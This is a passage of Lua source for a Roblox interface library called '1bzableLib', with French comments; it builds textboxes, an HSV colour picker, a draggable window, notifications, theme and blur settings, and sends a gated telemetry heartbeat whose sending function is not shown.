                and mouse.X <= popupPos.X + popupSize.X
                and mouse.Y >= popupPos.Y
                and mouse.Y <= popupPos.Y + popupSize.Y
    
            local buttonPos = button.AbsolutePosition
            local buttonSize = button.AbsoluteSize
    
            local insideButton =
                mouse.X >= buttonPos.X
                and mouse.X <= buttonPos.X + buttonSize.X
                and mouse.Y >= buttonPos.Y
                and mouse.Y <= buttonPos.Y + buttonSize.Y
    
            if not insidePopup and not insideButton then
                popup.Visible = false
            end
    
        end)
    end)

    connect(self.Window.Gui:GetPropertyChangedSignal("AbsolutePosition"), function()
        if popup.Visible then
            position()
        end
    end)

    rebuild()

    if config.Flag then
        Library.Flags[config.Flag] = api
    end

    return api
end

function TabMethods:AddTextbox(config)
    config = config or {}

    local frame = self:_card(44)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 0),
        Size = UDim2.new(0.40, 0, 1, 0),
        Text = config.Name or "Textbox",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    local box = new("TextBox", {
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Position = UDim2.new(0.40, 0, 0.5, 0),
        AnchorPoint = Vector2.new(0, 0.5),
        Size = UDim2.new(0.60, -12, 0, 32),
        Text = tostring(config.Default or ""),
        PlaceholderText = tostring(config.PlaceholderText or ""),
        TextColor3 = Library.Theme.Text,
        PlaceholderColor3 = Library.Theme.TextDark,
        Font = Enum.Font.Gotham,
        TextSize = 12,
        ClearTextOnFocus = config.TextDisappear == true,
        Parent = frame,
    })
    addCorner(box, 6)
    addStroke(box, Library.Theme.Stroke, 1, 0.2)

    local api = {
        Value = box.Text,
        Type = "Textbox",
    }

    function api:Set(value)
        box.Text = tostring(value or "")
        api.Value = box.Text
    end

    connect(box.FocusLost, function()
        api.Value = box.Text
        safeCallback(config.Callback, box.Text)
    end)

    if config.Flag then
        Library.Flags[config.Flag] = api
    end

    return api
end

function TabMethods:AddColorpicker(config)
    config = config or {}

    local value =
        typeof(config.Default) == "Color3"
        and config.Default
        or Library.Theme.Accent

    local frame = self:_card(46)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 0),
        Size = UDim2.new(1, -75, 1, 0),
        Text = config.Name or "Colorpicker",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    local swatch = new("TextButton", {
        AutoButtonColor = false,
        BackgroundColor3 = value,
        BorderSizePixel = 0,
        Position = UDim2.new(1, -54, 0.5, 0),
        AnchorPoint = Vector2.new(0, 0.5),
        Size = UDim2.new(0, 40, 0, 28),
        Text = "",
        ZIndex = 10,
        Parent = frame,
    })

    addCorner(swatch, 6)
    addStroke(swatch, Color3.new(1, 1, 1), 1, 0.65)

    ----------------------------------------------------------------
    -- POPUP FLOTTANT
    ----------------------------------------------------------------

    local popup = new("Frame", {
        Name = "ColorpickerPopup",
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Visible = false,
        ZIndex = 2000,
        Size = UDim2.fromOffset(245, 285),
        Parent = makePopupHost(self.Window),
    })

    addCorner(popup, 9)
    addStroke(popup, Library.Theme.Stroke, 1, 0)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.fromOffset(12, 8),
        Size = UDim2.new(1, -24, 0, 20),
        Text = config.Name or "Choisir une couleur",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        ZIndex = 2001,
        Parent = popup,
    })

    ----------------------------------------------------------------
    -- SATURATION / VALEUR
    ----------------------------------------------------------------

    local sv = new("Frame", {
        BackgroundColor3 = Color3.fromHSV(0, 1, 1),
        BorderSizePixel = 0,
        Position = UDim2.fromOffset(12, 34),
        Size = UDim2.fromOffset(185, 185),
        ZIndex = 2001,
        Parent = popup,
    })

    addCorner(sv, 7)

    -- Blanc -> couleur
    local whiteGradient = new("UIGradient", {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.new(1, 1, 1)),
            ColorSequenceKeypoint.new(1, Color3.new(1, 1, 1)),
        }),
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0),
            NumberSequenceKeypoint.new(1, 1),
        }),
        Rotation = 0,
        Parent = sv,
    })

    -- Noir -> transparent
    local blackOverlay = new("Frame", {
        BackgroundColor3 = Color3.new(0, 0, 0),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Size = UDim2.fromScale(1, 1),
        ZIndex = 2002,
        Parent = sv,
    })

    addCorner(blackOverlay, 7)

    local blackGradient = new("UIGradient", {
        Rotation = 90,
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.new(0, 0, 0)),
            ColorSequenceKeypoint.new(1, Color3.new(0, 0, 0)),
        }),
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0),
            NumberSequenceKeypoint.new(1, 1),
        }),
        Parent = blackOverlay,
    })

    ----------------------------------------------------------------
    -- CURSEUR SV
    ----------------------------------------------------------------

    local svCursor = new("Frame", {
        BackgroundColor3 = Color3.new(1, 1, 1),
        BorderSizePixel = 0,
        Size = UDim2.fromOffset(12, 12),
        AnchorPoint = Vector2.new(0.5, 0.5),
        ZIndex = 2005,
        Parent = sv,
    })

    addCorner(svCursor, 6)
    addStroke(svCursor, Color3.new(0, 0, 0), 1, 0.15)

    ----------------------------------------------------------------
    -- BARRE HUE
    ----------------------------------------------------------------

    local hueBar = new("Frame", {
        BackgroundColor3 = Color3.new(1, 1, 1),
        BorderSizePixel = 0,
        Position = UDim2.fromOffset(208, 34),
        Size = UDim2.fromOffset(22, 185),
        ZIndex = 2001,
        Parent = popup,
    })

    addCorner(hueBar, 7)

    local hueGradient = new("UIGradient", {
        Rotation = 90,
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)),
            ColorSequenceKeypoint.new(0.16, Color3.fromRGB(255, 255, 0)),
            ColorSequenceKeypoint.new(0.33, Color3.fromRGB(0, 255, 0)),
            ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 255, 255)),
            ColorSequenceKeypoint.new(0.66, Color3.fromRGB(0, 0, 255)),
            ColorSequenceKeypoint.new(0.83, Color3.fromRGB(255, 0, 255)),
            ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 0)),
        }),
        Parent = hueBar,
    })

    local hueCursor = new("Frame", {
        BackgroundColor3 = Color3.new(1, 1, 1),
        BorderSizePixel = 0,
        Size = UDim2.new(1, 4, 0, 8),
        Position = UDim2.new(-0.5, 0, 0, 0),
        AnchorPoint = Vector2.new(0.5, 0.5),
        ZIndex = 2005,
        Parent = hueBar,
    })

    addCorner(hueCursor, 4)
    addStroke(hueCursor, Color3.new(0, 0, 0), 1, 0.15)

    ----------------------------------------------------------------
    -- PREVIEW
    ----------------------------------------------------------------

    local preview = new("Frame", {
        BackgroundColor3 = value,
        BorderSizePixel = 0,
        Position = UDim2.fromOffset(12, 231),
        Size = UDim2.fromOffset(218, 32),
        ZIndex = 2001,
        Parent = popup,
    })

    addCorner(preview, 6)
    addStroke(preview, Library.Theme.Stroke, 1, 0.1)

    ----------------------------------------------------------------
    -- ETAT HSV
    ----------------------------------------------------------------

    local h, s, v = Color3.toHSV(value)

    local api = {
        Value = value,
        Type = "Colorpicker",
    }

    local function render()
        local hueColor = Color3.fromHSV(h, 1, 1)

        sv.BackgroundColor3 = hueColor
        preview.BackgroundColor3 = Color3.fromHSV(h, s, v)
        swatch.BackgroundColor3 = Color3.fromHSV(h, s, v)

        svCursor.Position = UDim2.new(
            s,
            0,
            1 - v,
            0
        )

        hueCursor.Position = UDim2.new(
            -0.5,
            0,
            h,
            0
        )
    end

    local function emit()
        local color = Color3.fromHSV(h, s, v)

        api.Value = color
        preview.BackgroundColor3 = color
        swatch.BackgroundColor3 = color

        safeCallback(config.Callback, color)
    end

    function api:Set(color)
        if typeof(color) ~= "Color3" then
            return
        end

        h, s, v = Color3.toHSV(color)
        api.Value = color
        render()
        safeCallback(config.Callback, color)
    end

    ----------------------------------------------------------------
    -- CALCUL SV
    ----------------------------------------------------------------

    local draggingSV = false
    local draggingHue = false

    local function updateSV(mouseX, mouseY)
        local size = sv.AbsoluteSize
        if size.X <= 0 or size.Y <= 0 then
            return
        end

        local px = math.clamp(
            (mouseX - sv.AbsolutePosition.X) / size.X,
            0,
            1
        )

        local py = math.clamp(
            (mouseY - sv.AbsolutePosition.Y) / size.Y,
            0,
            1
        )

        s = px
        v = 1 - py

        render()
        emit()
    end

    local function updateHue(mouseY)
        local size = hueBar.AbsoluteSize
        if size.Y <= 0 then
            return
        end

        h = math.clamp(
            (mouseY - hueBar.AbsolutePosition.Y) / size.Y,
            0,
            1
        )

        render()
        emit()
    end

    connect(sv.InputBegan, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            draggingSV = true
            updateSV(input.Position.X, input.Position.Y)
        end
    end)

    connect(hueBar.InputBegan, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            draggingHue = true
            updateHue(input.Position.Y)
        end
    end)

    connect(UserInputService.InputChanged, function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseMovement then
            return
        end

        if draggingSV then
            updateSV(input.Position.X, input.Position.Y)
        end

        if draggingHue then
            updateHue(input.Position.Y)
        end
    end)

    connect(UserInputService.InputEnded, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            draggingSV = false
            draggingHue = false
        end
    end)

    ----------------------------------------------------------------
    -- POSITIONNEMENT DU POPUP
    ----------------------------------------------------------------

    local function positionPopup()
        if not popup.Visible then
            return
        end

        local root = self.Window.Gui

        local rootPos = root.AbsolutePosition
        local rootSize = root.AbsoluteSize

        local swatchPos = swatch.AbsolutePosition
        local swatchSize = swatch.AbsoluteSize

        local popupSize = popup.AbsoluteSize

        local x =
            swatchPos.X
            - rootPos.X
            + swatchSize.X
            - popupSize.X

        local y =
            swatchPos.Y
            - rootPos.Y
            + swatchSize.Y
            + 6

        if x < 8 then
            x = 8
        end

        if x + popupSize.X > rootSize.X - 8 then
            x = rootSize.X - popupSize.X - 8
        end

        if y + popupSize.Y > rootSize.Y - 8 then
            y = swatchPos.Y - rootPos.Y - popupSize.Y - 6
        end

        if y < 8 then
            y = 8
        end

        popup.Position = UDim2.fromOffset(x, y)
    end

    ----------------------------------------------------------------
    -- OUVERTURE / FERMETURE
    ----------------------------------------------------------------

    connect(swatch.Activated, function()
        local newState = not popup.Visible

        -- Ferme les autres dropdown/popup.
        for _, other in ipairs(self.Window.Dropdowns or {}) do
            if other ~= popup and other.Parent then
                other.Visible = false
            end
        end

        popup.Visible = newState

        if popup.Visible then
            render()

            task.defer(function()
                if popup.Visible then
                    positionPopup()
                end
            end)
        end
    end)

    connect(UserInputService.InputEnded, function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1 then
            return
        end

        if not popup.Visible then
            return
        end

        task.defer(function()
            if not popup.Visible then
                return
            end

            local mouse = UserInputService:GetMouseLocation()

            local popupPos = popup.AbsolutePosition
            local popupSize = popup.AbsoluteSize

            local swatchPos = swatch.AbsolutePosition
            local swatchSize = swatch.AbsoluteSize

            local insidePopup =
                mouse.X >= popupPos.X
                and mouse.X <= popupPos.X + popupSize.X
                and mouse.Y >= popupPos.Y
                and mouse.Y <= popupPos.Y + popupSize.Y

            local insideSwatch =
                mouse.X >= swatchPos.X
                and mouse.X <= swatchPos.X + swatchSize.X
                and mouse.Y >= swatchPos.Y
                and mouse.Y <= swatchPos.Y + swatchSize.Y

            if not insidePopup and not insideSwatch then
                popup.Visible = false
            end
        end)
    end)

    connect(self.Window.Gui:GetPropertyChangedSignal("AbsolutePosition"), function()
        if popup.Visible then
            positionPopup()
        end
    end)

    connect(self.Window.Gui:GetPropertyChangedSignal("AbsoluteSize"), function()
        if popup.Visible then
            positionPopup()
        end
    end)

    if config.Flag then
        Library.Flags[config.Flag] = api
    end

    api:Set(value)

    return api
end

--========================================================--
-- Window
--========================================================--

function Library:IsRunning()
    for _, window in ipairs(self.Windows) do
        if not window.Destroyed and window.Gui and window.Gui.Parent then
            return true
        end
    end
    return false
end

function Library:MakeWindow(config)
    config = config or {}

    destroyExistingGui()

    local gui = new("ScreenGui", {
        Name = "1bzableLib",
        ResetOnSpawn = false,
        IgnoreGuiInset = true,
        ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
    })
    gui.Parent = getGuiParent()

    local main = new("Frame", {
        BackgroundColor3 = Library.Theme.Main,
        BackgroundTransparency = Library.Settings.BackgroundTransparency,
        BorderSizePixel = 0,
        Position = UDim2.new(0.5, -340, 0.5, -205),
        Size = UDim2.new(0, 680, 0, 410),
        Parent = gui,
    })
    addCorner(main, 11)
    addStroke(main, Library.Theme.Stroke, 1, 0.1)

    local top = new("Frame", {
        BackgroundColor3 = Library.Theme.Second,
        BackgroundTransparency = Library.Settings.BackgroundTransparency,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 0, 48),
        Parent = main,
    })
    addCorner(top, 11)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 16, 0, 0),
        Size = UDim2.new(1, -120, 1, 0),
        Text = config.Name or "1bzableLib",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBlack,
        TextSize = 17,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = top,
    })

    local minimize = new("TextButton", {
        AutoButtonColor = false,
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Position = UDim2.new(1, -74, 0, 9),
        Size = UDim2.new(0, 28, 0, 28),
        Text = "−",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 18,
        Parent = top,
    })
    addCorner(minimize, 6)

    local close = new("TextButton", {
        AutoButtonColor = false,
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Position = UDim2.new(1, -40, 0, 9),
        Size = UDim2.new(0, 28, 0, 28),
        Text = "×",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 17,
        Parent = top,
    })
    addCorner(close, 6)

    local sidebar = new("Frame", {
        BackgroundColor3 = Library.Theme.Second,
        BackgroundTransparency = Library.Settings.BackgroundTransparency,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 0, 0, 48),
        Size = UDim2.new(0, 165, 1, -48),
        Parent = main,
    })

    local tabList = new("ScrollingFrame", {
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 0, 0, 7),
        Size = UDim2.new(1, 0, 1, -80),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        CanvasSize = UDim2.new(),
        ScrollBarThickness = 3,
        ScrollBarImageColor3 = Library.Theme.Divider,
        Parent = sidebar,
    })

    new("UIListLayout", {
        Padding = UDim.new(0, 6),
        SortOrder = Enum.SortOrder.LayoutOrder,
        Parent = tabList,
    })

    new("UIPadding", {
        PaddingLeft = UDim.new(0, 8),
        PaddingRight = UDim.new(0, 8),
        Parent = tabList,
    })

    local contentHolder = new("Frame", {
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 165, 0, 48),
        Size = UDim2.new(1, -165, 1, -48),
        Parent = main,
    })

    -- Bottom-left LocalPlayer card.
    local playerCard = new("Frame", {
        BackgroundColor3 = Library.Theme.Main,
        BackgroundTransparency = Library.Settings.BackgroundTransparency,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 8, 1, -67),
        Size = UDim2.new(1, -16, 0, 54),
        Parent = sidebar,
    })
    addCorner(playerCard, 7)
    addStroke(playerCard, Library.Theme.Stroke, 1, 0.3)

    new("ImageLabel", {
        BackgroundColor3 = Library.Theme.Second,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 7, 0.5, 0),
        AnchorPoint = Vector2.new(0, 0.5),
        Size = UDim2.new(0, 38, 0, 38),
        Image = "rbxthumb://type=AvatarHeadShot&id="
            .. tostring(LocalPlayer.UserId)
            .. "&w=150&h=150",
        Parent = playerCard,
    })

    local avatar = playerCard:GetChildren()[1]
    if avatar and avatar:IsA("ImageLabel") then
        addCorner(avatar, 19)
    end

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 53, 0, 7),
        Size = UDim2.new(1, -60, 0, 17),
        Text = LocalPlayer.DisplayName or LocalPlayer.Name,
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextTruncate = Enum.TextTruncate.AtEnd,
        Parent = playerCard,
    })

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 53, 0, 25),
        Size = UDim2.new(1, -60, 0, 15),
        Text = "@" .. LocalPlayer.Name,
        TextColor3 = Library.Theme.TextDark,
        Font = Enum.Font.Gotham,
        TextSize = 9,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextTruncate = Enum.TextTruncate.AtEnd,
        Parent = playerCard,
    })

    local window = setmetatable({
        Gui = gui,
        Main = main,
        Top = top,
        Sidebar = sidebar,
        TabList = tabList,
        ContentHolder = contentHolder,
        PlayerCard = playerCard,
        Tabs = {},
        Dropdowns = {},
        PopupHost = nil,
        Minimized = false,
        Destroyed = false,
    }, WindowMethods)

    table.insert(self.Windows, window)

    makePopupHost(window)

    -- Onglet UI intégré : profils + couleurs + transparence + flou.
    task.defer(function()
        if not window.Destroyed then
            self:BuildUISettingsTab(window)
        end
    end)

    -- Dragging.
    do
        local dragging = false
        local dragStart
        local startPos

        connect(top.InputBegan, function(input)
            if input.UserInputType ~= Enum.UserInputType.MouseButton1 then
                return
            end

            dragging = true
            dragStart = input.Position
            startPos = main.Position
        end)

        connect(UserInputService.InputChanged, function(input)
            if not dragging or input.UserInputType ~= Enum.UserInputType.MouseMovement then
                return
            end

            local delta = input.Position - dragStart

            main.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end)

        connect(UserInputService.InputEnded, function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = false
            end
        end)
    end

    connect(minimize.Activated, function()
        window:ToggleMinimize()
    end)

    connect(close.Activated, function()
        window:Destroy()
    end)

    -- Fade-in.
    do
        local targetMainTransparency = main.BackgroundTransparency

        main.BackgroundTransparency = 1

        TweenService:Create(
            main,
            TweenInfo.new(Library.Settings.FadeTime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {BackgroundTransparency = targetMainTransparency}
        ):Play()
    end

    applyBlur()

    -- Start visible telemetry only after the 1bzable UI has loaded.
    if Telemetry.Enabled then
        task.spawn(function()
            task.wait(0.5)

            if Library:IsRunning() and Telemetry.Enabled then
                SendTelemetry("script_loaded", true)
            end

            while Library:IsRunning() and Telemetry.Enabled do
                task.wait(Telemetry.HeartbeatInterval)

                if Library:IsRunning() and Telemetry.Enabled then
                    SendTelemetry("heartbeat", true)
                end
            end
        end)
    end

    return window
end

function WindowMethods:ToggleMinimize()
    if self.Minimized then
        self:Restore()
        return
    end

    self.Minimized = true
    self.TabList.Visible = false
    self.Sidebar.Visible = false
    self.ContentHolder.Visible = false

    TweenService:Create(
        self.Main,
        TweenInfo.new(0.20, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
        {Size = UDim2.new(0, 250, 0, 48)}
    ):Play()
end

function WindowMethods:Minimize()
    if not self.Minimized then
        self:ToggleMinimize()
    end
end

function WindowMethods:Restore()
    self.Minimized = false
    self.TabList.Visible = true
    self.Sidebar.Visible = true
    self.ContentHolder.Visible = true

    TweenService:Create(
        self.Main,
        TweenInfo.new(0.20, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
        {Size = UDim2.new(0, 680, 0, 410)}
    ):Play()
end

function WindowMethods:Destroy()
    if self.Destroyed then
        return
    end

    self.Destroyed = true

    local gui = self.Gui
    local main = self.Main

    if main and main.Parent then
        TweenService:Create(
            main,
            TweenInfo.new(Library.Settings.FadeTime, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
            {BackgroundTransparency = 1}
        ):Play()
    end

    task.delay(Library.Settings.FadeTime + 0.03, function()
        if gui then
            pcall(function()
                gui:Destroy()
            end)
        end

        applyBlur()
    end)
end

function Library:MakeNotification(config)
    config = config or {}

    local window
    for i = #self.Windows, 1, -1 do
        local candidate = self.Windows[i]
        if candidate and not candidate.Destroyed and candidate.Gui and candidate.Gui.Parent then
            window = candidate
            break
        end
    end

    if not window then
        return
    end

    local holder = window.Gui:FindFirstChild("Notifications")

    if not holder then
        holder = new("Frame", {
            Name = "Notifications",
            BackgroundTransparency = 1,
            AnchorPoint = Vector2.new(1, 1),
            Position = UDim2.new(1, -15, 1, -15),
            Size = UDim2.new(0, 330, 0, 360),
            Parent = window.Gui,
            ZIndex = 2000,
        })

        new("UIListLayout", {
            Padding = UDim.new(0, 7),
            VerticalAlignment = Enum.VerticalAlignment.Bottom,
            Parent = holder,
        })
    end

    local frame = new("Frame", {
        BackgroundColor3 = Library.Theme.Second,
        BackgroundTransparency = 0.05,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 0, 0),
        AutomaticSize = Enum.AutomaticSize.Y,
        Parent = holder,
        ZIndex = 2001,
    })
    addCorner(frame, 8)
    addStroke(frame, Library.Theme.Stroke, 1, 0.15)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 8),
        Size = UDim2.new(1, -24, 0, 18),
        Text = config.Name or "Notification",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
        ZIndex = 2002,
    })

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 29),
        Size = UDim2.new(1, -24, 0, 34),
        Text = config.Content or "",
        TextColor3 = Library.Theme.TextDark,
        Font = Enum.Font.Gotham,
        TextSize = 11,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
        Parent = frame,
        ZIndex = 2002,
    })

    task.delay(tonumber(config.Time) or 3, function()
        if frame and frame.Parent then
            TweenService:Create(
                frame,
                TweenInfo.new(0.18),
                {BackgroundTransparency = 1}
            ):Play()

            task.wait(0.20)

            if frame then
                frame:Destroy()
            end
        end
    end)
end

function Library:SetBlur(enabled, size)
    self.Settings.BlurEnabled = enabled == true
    if size ~= nil then
        self.Settings.BlurSize = math.clamp(tonumber(size) or 8, 0, 24)
    end
    applyBlur()
end

function Library:SetBackgroundTransparency(value)
    self.Settings.BackgroundTransparency = math.clamp(
        tonumber(value) or 0.50,
        0,
        0.92
    )

    for _, window in ipairs(self.Windows) do
        if window.Main and window.Main.Parent then
            window.Main.BackgroundTransparency = self.Settings.BackgroundTransparency
        end
        if window.Top and window.Top.Parent then
            window.Top.BackgroundTransparency = self.Settings.BackgroundTransparency
        end
        if window.Sidebar and window.Sidebar.Parent then
            window.Sidebar.BackgroundTransparency = self.Settings.BackgroundTransparency
        end
        if window.PlayerCard and window.PlayerCard.Parent then
            window.PlayerCard.BackgroundTransparency = self.Settings.BackgroundTransparency
        end
    end
end

function Library:SetFadeTime(value)
    self.Settings.FadeTime = math.clamp(
        tonumber(value) or 0.20,
        0.05,
        1
    )
end

function Library:SetTheme(theme)
    if type(theme) ~= "table" then
        return
    end

    for key, value in pairs(theme) do
        if self.Theme[key] ~= nil then
            self.Theme[key] = value
        end
    end
end


function Library:ApplyUIProfile(name)
    local profile = self.UIProfiles[name]
    if type(profile) ~= "table" then
        return false
    end

    self.CurrentUIProfile = name

    self.Theme.Main = profile.Main
    self.Theme.Second = profile.Second
    self.Theme.Accent = profile.Accent

    self.Settings.BackgroundTransparency =
        math.clamp(tonumber(profile.BackgroundTransparency) or 0.50, 0, 0.90)

    local blurPercent =
        math.clamp(tonumber(profile.BlurPercent) or 0, 0, 100)

    self.Settings.BlurEnabled = blurPercent > 0
    self.Settings.BlurSize = 24 * (blurPercent / 100)

    for _, window in ipairs(self.Windows) do
        if window.Main then
            window.Main.BackgroundColor3 = self.Theme.Main
            window.Main.BackgroundTransparency =
                self.Settings.BackgroundTransparency
        end

        if window.Top then
            window.Top.BackgroundColor3 = self.Theme.Second
        end

        if window.Sidebar then
            window.Sidebar.BackgroundColor3 = self.Theme.Second
        end
    end

    applyBlur()
    return true
end

function Library:BuildUISettingsTab(window)
    local tab = window:MakeTab({
        Name = "UI",
    })

    tab:AddSection({
        Name = "Profil",
    })

    tab:AddDropdown({
        Name = "Profil",
        Default = self.CurrentUIProfile,
        Options = {"Default", "Midnight", "Emerald", "Ocean", "Crimson"},
        Callback = function(value)
            self:ApplyUIProfile(value)
        end,
    })

    tab:AddSection({
        Name = "Couleurs",
    })

    tab:AddColorpicker({
        Name = "Couleur primaire",
        Default = self.Theme.Main,
        Callback = function(value)
            self.Theme.Main = value
            for _, window in ipairs(self.Windows) do
                if window.Main then
                    window.Main.BackgroundColor3 = value
                end
            end
        end,
    })

    tab:AddColorpicker({
        Name = "Couleur secondaire",
        Default = self.Theme.Second,
        Callback = function(value)
            self.Theme.Second = value
            for _, window in ipairs(self.Windows) do
                if window.Top then
                    window.Top.BackgroundColor3 = value
                end
                if window.Sidebar then
                    window.Sidebar.BackgroundColor3 = value
                end
            end
        end,
    })

    tab:AddColorpicker({
        Name = "Couleur accent",
        Default = self.Theme.Accent,
        Callback = function(value)
            self.Theme.Accent = value
        end,
    })

    tab:AddSlider({
        Name = "Transparence du fond",
        Min = 0,
        Max = 90,
        Default = math.floor((self.Settings.BackgroundTransparency or 0.50) * 100),
        Increment = 5,
        ValueName = "%",
        Callback = function(value)
            self.Settings.BackgroundTransparency = value / 100
            for _, window in ipairs(self.Windows) do
                if window.Main then
                    window.Main.BackgroundTransparency =
                        self.Settings.BackgroundTransparency
                end
            end
        end,
    })

    tab:AddSlider({
        Name = "Flou",
        Min = 0,
        Max = 100,
        Default = math.floor(
            ((self.Settings.BlurSize or 0) / 24) * 100
        ),
        Increment = 5,
        ValueName = "%",
        Callback = function(value)
            self.Settings.BlurEnabled = value > 0
            self.Settings.BlurSize = 24 * (value / 100)
            applyBlur()
        end,
    })

    tab:AddToggle({
        Name = "Activer le flou",
        Default = self.Settings.BlurEnabled == true,
        Callback = function(value)
            self.Settings.BlurEnabled = value
            applyBlur()
        end,
    })

    tab:AddParagraph(
        "Info",
        "Le BlurEffect Roblox agit sur la scène complète. "
        .. "La transparence, les couleurs et les profils restent locaux à l'interface."
    )

    return tab
end

function Library:Init()
    applyBlur()
end

function Library:Destroy()
    Telemetry.Enabled = false
    for _, connection in ipairs(self.Connections) do
        pcall(function()
            connection:Disconnect()
        end)
    end

    table.clear(self.Connections)

    for _, window in ipairs(self.Windows) do
        pcall(function()
            window:Destroy()
        end)
    end

    table.clear(self.Windows)
    table.clear(self.Flags)
    applyBlur()
end

return Library
